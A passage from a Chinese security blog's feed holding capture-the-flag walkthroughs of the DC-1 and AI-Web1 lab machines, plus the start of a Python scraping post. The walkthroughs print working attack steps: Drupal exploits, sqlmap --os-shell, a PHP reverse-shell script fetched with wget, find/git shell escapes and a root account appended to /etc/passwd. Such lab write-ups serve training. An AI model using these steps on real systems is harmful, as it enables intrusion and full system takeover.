#登陆</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314153951516.png" alt="image-20240314153951516"></p><h3 id="1-9-提权"><a href="#1-9-提权" class="headerlink" title="1.9.提权"></a>1.9.提权</h3><p>查看一下可以使用的root权限命令</p><p>查找系统所有文件中拥有suid特殊权限的文件<br>-perm匹配权限<br>4000 2000 1000分别表示SUID SGID SBIT<br>1.普通文件，文件的权限一般三位，777最高文件权限-perm -0777搜索的就是最高权限的文件rwxrwxrwx-perm +0777搜索的只要包含rwxrwxrwx任意一个的文件2.特殊文件，包含权限位置四位，7000为最高，即-s-s-t，同样的方法-perm -7000搜索的就是最高权限的文件-s-s-t-perm +7000搜索的只要包含-s-s-t任意一个的文件，-s–(4000)、–s-(2000)、—t(1000)等</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240314154328064.png" alt="image-20240314154328064"></p><p>sudo可以使用，但是不能到root权限(可以尝试jerry的用户)<br>在使用su jerry (密码：adipiscing)</p><p><img src="/../image/image-20240314154511107.png" alt="image-20240314154511107"></p><p>jerry用户也不可以直接sudo su</p><p>补充：<a href="https://blog.csdn.net/mutou990/article/details/107724302">su知识</a></p><p><strong>[sudo su] 切换root身份，不携带当前用户环境变量。</strong><br><strong>[sudo su -]切换root身份，携带当前用户环境变量。</strong></p><p>发现可以使用git命令 (root权限)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo git help status </span><br></pre></td></tr></table></figure><p>输入!&#x2F;bin&#x2F;sh，直接输入就行</p><p><img src="/../image/image-20240314160001335.png" alt="image-20240314160001335"></p><p><img src="/../image/image-20240314160021137.png" alt="image-20240314160021137"></p><p><img src="/../image/image-20240314160050788.png" alt="image-20240314160050788"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2024/03/20/DC-1/"/>
      <url>/2024/03/20/DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p><p><strong>本靶场环境总共有5个flag</strong></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.174.0/24</span><br><span class="line">或者</span><br><span class="line">netdiscover -r 192.168.174.0/24  --排除1，2，254</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313195746995.png" alt="image-20240313195746995"></p><p>得到目标IP：<strong>192.168.174.145</strong></p><p>kali的IP：<strong>192.168.174.137</strong></p><h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -sV -O -A -p- 192.168.174.145</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36735/udp   status</span><br><span class="line">|   100024  1          42162/tcp6  status</span><br><span class="line">|   100024  1          57533/tcp   status</span><br><span class="line">|_  100024  1          58225/udp6  status</span><br><span class="line">57533/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7E:64:DD (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                     </span><br></pre></td></tr></table></figure><ul><li>22算口，开放了ssh服务，OpenSSH 6.0p1</li><li>80端口，存在web服务，Apache httpd 2.2.22，Drupal 7</li><li>111端口，开放了rpcbind服务</li></ul><p>补充知识：Drupal由php语言编写的cms，rpcbind是NFS中用来进行消息通知的服务</p><h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="/../image/image-20240313200659949.png" alt="image-20240313200659949"></p><p>可以看到是一个登陆界面，可能存在sql注入漏洞或弱口令，</p><h3 id="1-4-利用MSF渗透"><a href="#1-4-利用MSF渗透" class="headerlink" title="1.4. 利用MSF渗透"></a>1.4. 利用MSF渗透</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSF简单指令</span><br><span class="line">msfconsole进入MSF控制台</span><br><span class="line">search 搜索相应模块</span><br><span class="line">use           对应模块</span><br><span class="line">show options  查看信息</span><br><span class="line">set RHOST  远程主机ip</span><br><span class="line">run           攻击</span><br></pre></td></tr></table></figure><h4 id="1-4-1-搜索Drupal-7的漏洞"><a href="#1-4-1-搜索Drupal-7的漏洞" class="headerlink" title="1.4.1. 搜索Drupal 7的漏洞"></a>1.4.1. 搜索Drupal 7的漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Drupa 7</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313201413144.png" alt="image-20240313201413144"></p><p>可以发现能利用的漏洞非常多</p><h4 id="1-4-2-进入MSF控制台搜索drupal模块"><a href="#1-4-2-进入MSF控制台搜索drupal模块" class="headerlink" title="1.4.2. 进入MSF控制台搜索drupal模块"></a>1.4.2. 进入MSF控制台搜索drupal模块</h4><p><img src="/../image/image-20240313201539370.png" alt="image-20240313201539370"></p><h4 id="1-4-3-选择模块进行测试"><a href="#1-4-3-选择模块进行测试" class="headerlink" title="1.4.3. 选择模块进行测试"></a>1.4.3. 选择模块进行测试</h4><p>用2018的试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><h4 id="1-4-4-设置靶机IP运行msf"><a href="#1-4-4-设置靶机IP运行msf" class="headerlink" title="1.4.4 设置靶机IP运行msf"></a>1.4.4 设置靶机IP运行msf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.174.145</span><br><span class="line">run </span><br></pre></td></tr></table></figure><h4 id="1-4-5-进入shell"><a href="#1-4-5-进入shell" class="headerlink" title="1.4.5 进入shell"></a>1.4.5 进入shell</h4><p><img src="/../image/image-20240313201920626.png" alt="image-20240313201920626"></p><p>但不是root权限，不妨先find一下flag问价</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -iname &quot;*flag*&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313202242817.png" alt="image-20240313202242817"></p><p>有点多，先把带txt的过滤出来</p><p><img src="/../image/image-20240313202404685.png" alt="image-20240313202404685"></p><p>先找一下这三个</p><p><img src="/../image/image-20240313202717938.png" alt="image-20240313202717938"></p><p>可以看到其中只有flag1.txt是我们能访问的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">每个好的CMS都需要一个配置文件——你也一样。</span><br></pre></td></tr></table></figure><p>通过这个线索我们可以区找一下这个cms的配置文件，但这个界面确实不怎么好看，使用python反弹一个交互式shell TTY。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313203341574.png" alt="image-20240313203341574"></p><p>搜索发现drupal的配置文件是 &#x2F;sites&#x2F;default&#x2F;settings.php ，是数据库连接配置文件。</p><p>去看一下能不能看到这个文件的信息</p><p><img src="/../image/image-20240313203955072.png" alt="image-20240313203955072"></p><p>可以看到数据库的账号密码,英文意思如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破攻击和字典攻击不是</span><br><span class="line">获得访问权限的唯一方法(您将需要访问权限)。</span><br><span class="line">你能用这些证书做什么?</span><br></pre></td></tr></table></figure><h4 id="登陆数据库"><a href="#登陆数据库" class="headerlink" title="登陆数据库"></a>登陆数据库</h4><p><strong>Drupal框架默认的用户表就是users表</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -pR0ck3t</span><br><span class="line">show databses; --发现drup数据库</span><br><span class="line">show tables; --发现users表</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313204216786.png" alt="image-20240313204216786"></p><p>发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal 6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。</p><p>这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。</p><h5 id="方法一重置密码"><a href="#方法一重置密码" class="headerlink" title="方法一重置密码"></a>方法一重置密码</h5><p><img src="/../image/image-20240313205708345.png" alt="image-20240313205708345"></p><p>不知道为什么我用这个会报错说文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456</span><br><span class="line">php ./scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">password: 123456                hash: $S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa</span><br></pre></td></tr></table></figure><p>原来要在根目录下使用</p><p>在指定目录下执行脚本是为了确保脚本能够正确加载所需的文件和依赖项。在Drupal中，脚本需要包含Drupal的核心文件和库才能生成正确的密码哈希。一般情况下，Drupal的根目录包含<code>index.php</code>文件和<code>sites</code>目录。</p><p>得到后，再把他写入数据库中</p><p>mysql -h是MySQL命令行客户端中的参数，用于指定要连接的MySQL服务器的主机名或IP地址。在命令行中，-h后面可以跟上要连接的MySQL服务器的主机名或IP地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u dbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p>然后把密码写如user表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass=&quot;$S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313211312372.png" alt="image-20240313211312372"></p><p><img src="/../image/image-20240313211331364.png" alt="image-20240313211331364"></p><h5 id="方法二，利用漏洞添加admin用户"><a href="#方法二，利用漏洞添加admin用户" class="headerlink" title="方法二，利用漏洞添加admin用户"></a>方法二，利用漏洞添加admin用户</h5><p><img src="/../image/image-20240313213434032.png" alt="image-20240313213434032"></p><p>但有版本要求，所以我们需要先查看drupal的版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313214051628.png" alt="image-20240313214051628"></p><p>7.21是可以利用该漏洞的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.145 -u youzipii -p 123123</span><br><span class="line">需要注意用python3会报错，要用python2执行</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313214725060.png"></p><p><img src="/../image/image-20240313214901260.png" alt="image-20240313214901260"></p><p>可以看到也登陆进来了</p><h4 id="1-4-6-flag3"><a href="#1-4-6-flag3" class="headerlink" title="1.4.6 flag3"></a>1.4.6 flag3</h4><p><img src="/../image/image-20240313215010627.png" alt="image-20240313215010627"></p><p>翻译一下：特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容 </p><p>别人说很明显的提示：find+perms+exec 命令用来提权</p><h4 id="1-4-7-flag4"><a href="#1-4-7-flag4" class="headerlink" title="1.4.7 flag4"></a>1.4.7 flag4</h4><p>根据flag3的提示提权，我们尝试查看用户列表信息（包含用户权限信息），这些用户信息一般存储在&#x2F;etc&#x2F;passwd目录下。</p><p><img src="/../image/image-20240313215214862.png" alt="image-20240313215214862"></p><p><strong>注意，&#x2F;etc&#x2F;passwd包含系统所有账户信息，只有超级用户才有写和访问。该文件每个用户占一行用，分隔成七个字段。如下图所示：</strong></p><p><img src="https://img2020.cnblogs.com/blog/1962254/202007/1962254-20200713224545400-294633646.png" alt="img"></p><p>切换到home目录寻找flag4相关文件,并尝试查看。</p><p><img src="/../image/image-20240313215341017.png" alt="image-20240313215341017"></p><p><strong>提示最后flag in root下面。</strong></p><h4 id="1-4-8-提权-获得最终flag"><a href="#1-4-8-提权-获得最终flag" class="headerlink" title="1.4.8 提权+获得最终flag"></a><strong>1.4.8 提权+获得最终flag</strong></h4><p><img src="/../image/image-20240313215633609.png" alt="image-20240313215633609"></p><p>下面就是提权了</p><p>根据flag3中的提示，使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find ./ acce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br><span class="line">2. <span class="built_in">touch</span> bcce有可能不能创建</span><br><span class="line">find bcce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240313215833812.png" alt="image-20240313215833812"></p><p>访问最后一个flag</p><p><img src="/../image/image-20240313215921134.png" alt="image-20240313215921134"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ai-web1通关记录</title>
      <link href="/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="AI-Web1通关记录"><a href="#AI-Web1通关记录" class="headerlink" title="AI-Web1通关记录"></a>AI-Web1通关记录</h1><p><strong>学习自<a href="https://blog.csdn.net/qq_51577576?type=blog">_PowerShell</a></strong></p><p><strong>靶机地址：192.168.174.134</strong></p><p><strong>kali地址：192.168.174.137</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ nmap -sn 192.168.174.0/24 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:30 CST</span><br><span class="line">Nmap scan report for 192.168.174.2</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Nmap scan report for 192.168.174.134</span><br><span class="line">Host is up (0.00059s latency).</span><br><span class="line">Nmap scan report for 192.168.174.137</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 5.09 seconds</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo nmap -T4 -sV -O -A -p- 192.168.174.134</span><br><span class="line">[sudo] password for eraser: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:36 CST</span><br><span class="line">Nmap scan report for 192.168.174.134</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/m3diNf0/ /se3reTdir777/uploads/</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: AI Web 1.0</span><br><span class="line">MAC Address: 00:0C:29:BD:8C:E3 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.71 ms 192.168.174.134</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds</span><br></pre></td></tr></table></figure><p>可以看到开放了一个80端口，以及一些网站目录，尝试访问一下</p><h3 id="访问目标页面"><a href="#访问目标页面" class="headerlink" title="访问目标页面"></a>访问目标页面</h3><p><img src="/../image/image-20240312134058310.png" alt="image-20240312134058310"></p><p>谷歌都搜不到，没什么信息，继续看下其它目录有什么信息</p><h4 id="robots-txt资料"><a href="#robots-txt资料" class="headerlink" title="robots.txt资料"></a>robots.txt<a href="https://zhuanlan.zhihu.com/p/65463520">资料</a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: </span><br><span class="line">Disallow: /m3diNf0/</span><br><span class="line">Disallow: /se3reTdir777/uploads/</span><br></pre></td></tr></table></figure><p>查阅资料发现,robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p><ul><li>不要访问某个文件、文件夹</li><li>禁止某些爬虫的访问</li><li>限制爬虫访问网站的频率</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">robots.txt的内容</span><br><span class="line">User-agent: 爬虫的名称</span><br><span class="line">Disallow: 不允许爬虫访问的地址</span><br><span class="line">Allow: 允许爬虫访问的地址</span><br><span class="line">若User-agent是*，则表示对象是所有爬虫。</span><br></pre></td></tr></table></figure><p><a href="https://developers.google.com/search/docs/crawling-indexing/robots/intro?hl=zh-cn">官方文档</a></p><p>结合以上信息，&#x2F;m3diNf0&#x2F;和&#x2F;se3reTdir777&#x2F;uploads&#x2F;是不希望访问的目录，推测里面有重要信息，但不知道具体内容，扫描下网站目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# dirb http://192.168.174.134/m3diNf0/ </span><br><span class="line">+ http://192.168.174.134/m3diNf0/info.php (CODE:200|SIZE:84305)     </span><br><span class="line">.....</span><br><span class="line">└─# dirb http://192.168.174.134/se3reTdir777            </span><br><span class="line">---- Scanning URL: http://192.168.174.134/se3reTdir777/ ----</span><br><span class="line">+ http://192.168.174.134/se3reTdir777/index.php (CODE:200|SIZE:1228) </span><br><span class="line">...     </span><br></pre></td></tr></table></figure><p>可以看到前一个目录下有个info.php文件，后一个目录下有个index.php,分别尝试访问，</p><h2 id="x2F-m3diNf0"><a href="#x2F-m3diNf0" class="headerlink" title="&#x2F;m3diNf0"></a>&#x2F;m3diNf0</h2><h3 id="info-php"><a href="#info-php" class="headerlink" title="info.php"></a>info.php</h3><p><img src="/../image/image-20240312140833736.png" alt="image-20240312140833736"></p><p>发现绝对路径：&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;m3diNf0&#x2F;info.php </p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><p>一个是个看着很明显的sql注入界面，输入1提交一下，有回显</p><p><img src="/../image/image-20240312141051083.png" alt="image-20240312141051083"></p><p>判断是否存在注入点，输入分号试试</p><p><img src="/../image/image-20240312141259232.png" alt="image-20240312141259232"></p><p>存在报错</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>这里我们先抓包，确认请求参数</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">POST /se3reTdir777/index.php HTTP/1.1</span><br><span class="line">Host: 192.168.174.134</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 22</span><br><span class="line">Origin: http://192.168.174.134</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.174.134/se3reTdir777/index.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">uid=1&amp;Operation=Submit</span><br></pre></td></tr></table></figure><p>可以看到注入参数为“uid&#x3D;1&amp;Operation&#x3D;Submit”</p><p>下面用sqlmap爆破数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312144608515.png" alt="image-20240312144608515"></p><p>看看aiweb1里的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --tables</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312144720285.png" alt="image-20240312144720285"></p><p>看看表里的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777/index.php&quot; --data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T user --dump</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312145259001.png" alt="image-20240312145259001"></p><p>没什么有用信息</p><p>尝试使用sqlmap的–os-shell命令</p><p>os-shell执行条件有三个：<br>　 1.网站必须是root权限<br>　 2.网站的绝对路径已知<br>　 3.GPC为off（php主动转义的功能关闭）</p><p>依次选择 php(default)，custom location(s)<br>根据前面找到的info.php文件暴露的信息，绝对路径选择：&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;se3reTdir777&#x2F;uploads&#x2F;<br>uploads的目录是可以成功写入的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.134/se3reTdir777&quot; --data &#x27;uid=1&amp;Operation=Submit&#x27; --level=3 --os-shell</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312150251817.png" alt="image-20240312150251817"></p><p>成功反弹到shell，但是权限极低，面临提权问题</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>准备好一个提权脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sock=fsockopen(&quot;192.168.174.137&quot;,8888);</span><br><span class="line">exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>使用python搭建一个简易的服务器</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m http.server <span class="number">9966</span></span><br><span class="line"><span class="comment">#9966为端口号，可自己指定</span></span><br></pre></td></tr></table></figure><p>此时简易服务器已搭建完成，接下来打开网页，访问本机，查看搭建是否成功</p><p><img src="/../image/image-20240312151128619.png" alt="image-20240312151128619"></p><p><strong>下载文件到靶机</strong></p><p>回到我们控制目标shell的窗口，下载文件</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">wget -S http://192.168.174.137:9966/test.php</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312151226436.png" alt="image-20240312151226436"></p><p>有时候可能会出现异常，多试几次就可以了。再打开一个终端，对8888端口进行监听：<strong>nc -lvp 8888</strong>,之后就直接运行文件 <strong>php shell.php</strong> 就可成功反弹shell</p><p><img src="/../image/image-20240312151346480.png" alt="image-20240312151346480"></p><p><strong>提权到root</strong></p><p>可以用python转换成交互式shell，这样看着更舒服</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312152427442.png" alt="image-20240312152427442"></p><p>发现当前用户不是root用户但是这个用户可以对&#x2F;etc&#x2F;passwd 文件进行写入权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /etc</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312152835669.png" alt="image-20240312152835669"></p><p>所以我们尝试添加一个用户登录，因为写入的时候密码是加密的，所以要先加密密码,：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt web1 123456   //用openssl生成用户，用户名为panda ，密码为 panda</span><br><span class="line">$1$web1$ZrYgDZgZpLlsnVlxUaZwh/   //生成后/etc/passwd储存用户格式的文件</span><br><span class="line">panda:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0:root:/root:/bin/bash  //写入/etc/passwd文件的格式</span><br></pre></td></tr></table></figure><p>然后再来写入密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#x27;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240312153132553.png" alt="image-20240312153132553"></p><p>切换用户到我们刚刚自己创建的 web1</p><p><img src="/../image/image-20240312153441484.png" alt="image-20240312153441484"></p><p>查看权限，已经是root权限，并且成功拿取到flag</p><p><img src="/../image/image-20240312153548149.png" alt="image-20240312153548149"></p><p><img src="/../image/image-20240312153911324.png" alt="image-20240312153911324"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2024/03/15/python%E7%88%AC%E8%99%AB/"/>
      <url>/2024/03/15/python%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://requests.readthedocs.io/projects/cn/zh-cn/latest/">python request官方文档</a></p><h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h2 id="爬百度翻译"><a href="#爬百度翻译" class="headerlink" title="爬百度翻译"></a>爬百度翻译</h2><p>在翻译网站随便输入个中文翻译，然后按F12</p><p><img src="/../image/image-20240315222830216.png" alt="image-20240315222830216"></p><p>知道带正确返回的值，然后查看标头，就能知道url了</p><p><img src="/../image/image-20240315222919311.png" alt="image-20240315222919311"></p><p>然后也要注意请求方法，对于参数我们可以去payload（载荷）看</p><p><img src="/../image/image-20240315223000282.png" alt="image-20240315223000282"></p><p>之前找错了，那个表单有个sign和ts（时间戳），这两个是会变化的值，在写data的时候不容易弄，发现sug里有个更简单的表单数据，就用这个了，下面是代码.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># timestamp = time.time()</span></span><br><span class="line"><span class="comment"># print(&quot;当前时间戳：&quot;, timestamp)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    word = <span class="built_in">input</span>(<span class="string">&quot;请输入你需要翻译的中文(q-退出)：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> word == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span 